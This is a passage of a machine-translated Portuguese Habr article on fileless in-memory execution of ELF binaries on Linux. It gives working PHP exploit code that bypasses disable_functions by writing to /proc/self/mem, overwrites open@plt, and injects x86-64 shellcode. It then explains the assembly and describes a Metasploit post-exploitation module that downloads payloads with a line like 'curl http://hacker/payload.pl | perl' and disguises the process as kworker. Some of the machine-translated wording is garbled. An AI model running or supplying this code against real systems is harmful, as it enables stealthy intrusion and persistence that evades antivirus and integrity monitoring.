class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span class="hljs-number"><span class="hljs-number">10000</span></span> + $version[<span class="hljs-number"><span class="hljs-number">1</span></span>] * <span class="hljs-number"><span class="hljs-number">100</span></span> + $version[<span class="hljs-number"><span class="hljs-number">2</span></span>])); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (PHP_VERSION_ID &lt; <span class="hljs-number"><span class="hljs-number">50207</span></span>) { define(<span class="hljs-string"><span class="hljs-string">'PHP_MAJOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">0</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_MINOR_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">1</span></span>]); define(<span class="hljs-string"><span class="hljs-string">'PHP_RELEASE_VERSION'</span></span>, $version[<span class="hljs-number"><span class="hljs-number">2</span></span>]); } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PHP major version "</span></span> . PHP_MAJOR_VERSION . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Verificamos a profundidade de bits do sistema operacional e a vers√£o do kernel do Linux: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strpos(php_uname(<span class="hljs-string"><span class="hljs-string">'a'</span></span>), <span class="hljs-string"><span class="hljs-string">'x86_64'</span></span>) === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] This exploit is for x64 Linux. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(substr(php_uname(<span class="hljs-string"><span class="hljs-string">'r'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>) &lt; <span class="hljs-number"><span class="hljs-number">2.98</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Too old kernel (&lt; 2.98). Might not work\n"</span></span>; }</code> </pre> <br><p>  Para contornar as restri√ß√µes de <code>disable_functions</code> , o script reescreve o endere√ßo da fun√ß√£o <code>open@plt</code> em tempo real.  Fizemos algumas adi√ß√µes ao c√≥digo, e agora podemos colocar nosso c√≥digo de shell na mem√≥ria. </p><br><p>  Primeiro voc√™ precisa encontrar a mudan√ßa no arquivo bin√°rio do pr√≥prio interpretador PHP, para isso, voltamos para <code>/proc/self/exe</code> e analisamos o arquivo execut√°vel usando a fun√ß√£o <code>parseelf()</code> descrita acima: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open@plt offset in PHP binary\n"</span></span>; $open_php = parseelf(<span class="hljs-string"><span class="hljs-string">'/proc/self/exe'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($open_php == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[+] Offset is 0x'</span></span> . dechex($open_php) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $maps = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/proc/self/maps'</span></span>); preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(/.+libc\-.+)#'</span></span>, $maps, $r); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Libc location: $r[1]\n"</span></span>; preg_match(<span class="hljs-string"><span class="hljs-string">'#\s+(.+\[stack\].*)#'</span></span>, $maps, $m); $stack = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $m[<span class="hljs-number"><span class="hljs-number">1</span></span>])[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Stack location: "</span></span>.dechex($stack).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; $pie_base = hexdec(explode(<span class="hljs-string"><span class="hljs-string">'-'</span></span>, $maps)[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] PIE base: "</span></span>.dechex($pie_base).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Trying to get open and system symbols from Libc\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($system_offset, $open_offset) = parseelf($r[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($system_offset == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> $open_offset == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[-] Failed. Exiting\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Encontre o endere√ßo da fun√ß√£o <code>open()</code> : </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Got them. Seeking for address in memory\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'rb'</span></span>); fseek($mem, ((PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base) + $open_php); $open_addr = unp(fread($mem, <span class="hljs-number"><span class="hljs-number">8</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[INFO] open@plt addr: 0x'</span></span> . dechex($open_addr) . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Rewriting open@plt address\n"</span></span>; $mem = fopen(<span class="hljs-string"><span class="hljs-string">'/proc/self/mem'</span></span>, <span class="hljs-string"><span class="hljs-string">'wb'</span></span>);</code> </pre> <br><p>  Agora voc√™ pode ir diretamente para o download do nosso arquivo execut√°vel. <br>  Primeiro, crie um arquivo an√¥nimo: </p><br><pre> <code class="php hljs">$shellcode_loc = $pie_base + <span class="hljs-number"><span class="hljs-number">0x100</span></span>; $shellcode=<span class="hljs-string"><span class="hljs-string">"\x48\x31\xD2\x52\x54\x5F\x6A\x01\x5E\x68\x3F\x01\x00\x00\x58\x0F\x05\x5A\xC3"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fseek($mem, (PHP_MAJOR_VERSION == <span class="hljs-number"><span class="hljs-number">7</span></span>) * $pie_base + $open_php); fwrite($mem, packlli($shellcode_loc)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Address written. Executing cmd\n"</span></span>; $fp = fopen(<span class="hljs-string"><span class="hljs-string">'fd'</span></span>, <span class="hljs-string"><span class="hljs-string">'w'</span></span>);</code> </pre> <br><p>  Escrevemos a carga em um arquivo an√¥nimo: </p><br><pre> <code class="php hljs">fwrite($fp, $elf);</code> </pre> <br><p>  Estamos procurando o n√∫mero do descritor de arquivo: </p><br><pre> <code class="php hljs">$found = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $fds = scandir(<span class="hljs-string"><span class="hljs-string">"/proc/self/fd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>($fds <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $fd) { $path = <span class="hljs-string"><span class="hljs-string">"/proc/self/fd/$fd"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!is_link($path)) <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strstr(readlink($path), <span class="hljs-string"><span class="hljs-string">"memfd"</span></span>)) { $found = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!$found) { <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">'[-] memfd not found'</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; }</code> </pre> <br><p>  Em seguida, escrevemos o caminho para o arquivo execut√°vel na pilha: </p><br><pre> <code class="php hljs">fseek($mem, $stack); fwrite($mem, <span class="hljs-string"><span class="hljs-string">"{$path}\x00"</span></span>); $filename_ptr = $stack; $stack += strlen($path) + <span class="hljs-number"><span class="hljs-number">1</span></span>; fseek($mem, $stack);</code> </pre> <br><p>  E os argumentos a serem executados passaram para o execut√°vel: </p><br><pre> <code class="php hljs">fwrite($mem, str_replace(<span class="hljs-string"><span class="hljs-string">" "</span></span>, <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, $args) . <span class="hljs-string"><span class="hljs-string">"\x00"</span></span>); $str_ptr = $stack; $argv_ptr = $arg_ptr = $stack + strlen($args) + <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span>(explode(<span class="hljs-string"><span class="hljs-string">' '</span></span>, $args) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $arg) { fseek($mem, $arg_ptr); fwrite($mem, packlli($str_ptr)); $arg_ptr += <span class="hljs-number"><span class="hljs-number">8</span></span>; $str_ptr += strlen($arg) + <span class="hljs-number"><span class="hljs-number">1</span></span>; } fseek($mem, $arg_ptr); fwrite($mem, packlli(<span class="hljs-number"><span class="hljs-number">0x0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[INFO] Argv: "</span></span> . $args . <span class="hljs-string"><span class="hljs-string">"\n"</span></span>;</code> </pre> <br><p>  Em seguida, chamando <code>fork()</code> , executamos nossa carga √∫til: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"[+] Starting ELF\n"</span></span>; $shellcode = <span class="hljs-string"><span class="hljs-string">"\x6a\x39\x58\x0f\x05\x85\xc0\x75\x28\x6a\x70\x58\x0f\x05\x6a\x39\x58\x0f\x05\x85\xc0\x75\x1a\x48\xbf"</span></span> . packlli($filename_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\xbe"</span></span> . packlli($argv_ptr) . <span class="hljs-string"><span class="hljs-string">"\x48\x31\xd2\x6a\x3b\x58\x0f\x05\xc3\x6a\x00\x5f\x6a\x3c\x58\x0f\x05"</span></span>; fseek($mem, $shellcode_loc); fwrite($mem, $shellcode); fopen(<span class="hljs-string"><span class="hljs-string">'done'</span></span>, <span class="hljs-string"><span class="hljs-string">'r'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>();</code> </pre> <br><h4 id="shellkod">  Shellcode </h4><br><p>  Shellcode geralmente significa uma sequ√™ncia de bytes que s√£o armazenados na mem√≥ria e executados, geralmente no contexto de outro programa, usando ataques de buffer overflow e outros.  No nosso caso, o c√≥digo de shell n√£o retorna o prompt de comando do servidor remoto (na verdade, o Shell), mas nos permite executar os comandos que precisamos. </p><br><p>  Para obter a sequ√™ncia de bytes necess√°ria, voc√™ pode escrever o c√≥digo C e traduzi-lo para a linguagem assembler ou escrever a linguagem assembly a partir do zero. </p><br><p>  Vamos ver o que est√° escondido atr√°s da sequ√™ncia de bytes das listagens acima. </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  O lan√ßamento do nosso programa come√ßa com c <code>fork</code> .  57 √© o valor num√©rico do identificador de chamada do sistema para sistemas de 64 bits.  A tabela pode ser encontrada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . </p><br><p>  Em seguida, chamamos <code>setsid</code> (identificador num√©rico 112) para converter o processo filho no pai: </p><br><pre> <code class="plaintext hljs">push 112 pop rax syscall</code> </pre> <br><p>  Em seguida, fa√ßa outro <code>fork</code> : </p><br><pre> <code class="plaintext hljs">push 57 pop rax syscall test eax, eax jnz quit</code> </pre> <br><p>  Em seguida, execute o familiar <code>execve()</code> : </p><br><pre> <code class="plaintext hljs">; execve mov rdi, 0xcafebabecafebabe ; filename mov rsi, 0xdeadbeefdeadbeef ; argv xor rdx, rdx ; envp push 0x3b pop rax syscall push -1 pop rax ret</code> </pre> <br><p>  E finalizamos o processo com <code>exit()</code> (60): </p><br><pre> <code class="plaintext hljs">; exit quit: push 0 pop rdi push 60 pop rax syscall</code> </pre> <br><p>  Assim, substitu√≠mos o c√≥digo da fun√ß√£o open () em movimento.  Nosso arquivo execut√°vel foi colocado na mem√≥ria e executado por meio do interpretador PHP.  As chamadas do sistema s√£o apresentadas como c√≥digos de shell. </p><br><h3 id="metasploit-framework">  Estrutura Metasploit </h3><br><p>  Como uma compila√ß√£o das t√©cnicas acima, preparamos um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">m√≥dulo para MSF</a> . </p><br><p>  Para adicion√°-lo ao Metasploit, simplesmente copie o arquivo do m√≥dulo para o diret√≥rio <code>$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb</code> e execute o comando <code>reload_all</code> no console da estrutura. <br>  Para usar nosso m√≥dulo, digite <code>use post/linux/manage/download_exec_elf_in_memory</code> (ou outro caminho, dependendo do diret√≥rio em que o arquivo do m√≥dulo foi colocado) <br>  Antes de us√°-lo, voc√™ deve definir as op√ß√µes necess√°rias.  A lista de op√ß√µes √© exibida com o comando <code>show options</code> . </p><br><p>  <code>ARGS</code> - Argumentos para o execut√°vel </p><br><p>  <code>FILE</code> - caminho para o arquivo execut√°vel.  No nosso caso, este √© o Netcat. </p><br><p>  <code>NAME</code> √© o nome do processo.  Voc√™ pode cham√°-lo de qualquer coisa.  Por exemplo, para fins de furtividade, este pode ser o kworker: 1 po√ßo, ou com o objetivo de demonstrar algo c√¥mico, por exemplo, KittyCat </p><br><p>  <code>SESSION</code> - sess√£o do medidor.  Entende-se que este m√≥dulo ser√° utilizado para fins p√≥s-opera√ß√£o. </p><br><p>  Em seguida, designamos o host no qual o servidor http com nossa carga estar√° localizado e sua porta nas <code>SRVPORT</code> e <code>SRVPORT</code> respectivamente. </p><br><p>  <code>VECTOR</code> - o m√©todo pelo qual a execu√ß√£o do programa na mem√≥ria ser√° alcan√ßada; o par√¢metro √© opcional; se estiver vazio, o pr√≥prio script estabelecer√° a presen√ßa dos int√©rpretes necess√°rios.  Atualmente, h√° suporte para PHP, Python ou Perl. </p><br><p>  <code>run</code> usando o comando <code>exploit</code> ou <code>run</code> </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/y9vRUItW_5c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><p>  Funciona da seguinte maneira - indicamos a sess√£o desejada, pode ser um medidor de temperatura ou um inversor comum.  A seguir, indicamos o caminho local para o nosso elfo, os argumentos e o nome desejado na lista de processos.  Ap√≥s o in√≠cio, um servidor da web local ser√° iniciado para hospedar a carga, e a sess√£o procurar√° "cadeiras de balan√ßo", o curl e o wget s√£o suportados atualmente.  Ap√≥s encontrar pelo menos um deles, todos os int√©rpretes ser√£o pesquisados ‚Äã‚Äãse n√£o especificarmos no par√¢metro <code>VECTOR</code> qual deles precisamos.  Bem, se for bem-sucedido, um comando ser√° executado para baixar a carga √∫til do nosso servidor da Web e transferi-la por canal para o int√©rprete desejado, ou seja,  algo como <code>$ curl http://hacker/payload.pl | perl</code> <code>$ curl http://hacker/payload.pl | perl</code> </p><br><h3 id="vmesto-zaklyucheniya">  Em vez de uma conclus√£o. </h3><br><p>  O download de arquivos ELF sem arquivo no Linux √© uma t√©cnica √∫til para teste de penetra√ß√£o.  Este √© um m√©todo bastante silencioso que pode suportar uma ampla variedade de ferramentas de prote√ß√£o antiv√≠rus, sistemas de monitoramento de integridade e sistemas de monitoramento que monitoram altera√ß√µes no conte√∫do do disco r√≠gido.  Dessa forma, voc√™ pode manter facilmente o acesso ao sistema de destino, deixando um m√≠nimo de rastreios. <br>  Neste artigo, usamos linguagens de programa√ß√£o interpretadas, geralmente instaladas por padr√£o em distribui√ß√µes, firmware, roteadores e dispositivos m√≥veis Linux.  Tamb√©m gostaria de agradecer ao autor <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">deste artigo</a> , que nos inspirou nesta revis√£o. </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt430902/">https://habr.com/ru/post/pt430902/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt430890/index.html">Onde o √°gil √© terr√≠vel, especialmente o scrum</a></li>
<li><a href="../pt430892/index.html">A combina√ß√£o de plataforma cruzada e abordagem nativa no desenvolvimento de aplicativos m√≥veis</a></li>
<li><a href="../pt430894/index.html">Situa√ß√£o: as marcas est√£o gastando cada vez mais dinheiro em publicidade em podcasts - entendemos por que</a></li>
<li><a href="../pt430896/index.html">A Linux Foundation estabeleceu fundos para GraphQL e Ceph - por que eles s√£o necess√°rios e o que esperar deles</a></li>
<li><a href="../pt430900/index.html">O primeiro laser na hist√≥ria: o que era</a></li>
<li><a href="../pt430906/index.html">M√£e dorme calmamente √† noite - coletamos o OpenCV para Raspbian'a</a></li>
<li><a href="../pt430908/index.html">M√≥dulo de controle do conversor de energia: desenvolvimento e montagem</a></li>
<li><a href="../pt430910/index.html">Bolsa de Estudos Fulbright: Como e Por qu√™?</a></li>
<li><a href="../pt430912/index.html">Trazemos um mentiroso para a √°gua pot√°vel: uma entrevista n√£o √© uma rela√ß√£o de emprego. Naturalmente</a></li>
<li><a href="../pt430914/index.html">An√°lise dos pre√ßos do mercado negro para dados pessoais e avan√ßo</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>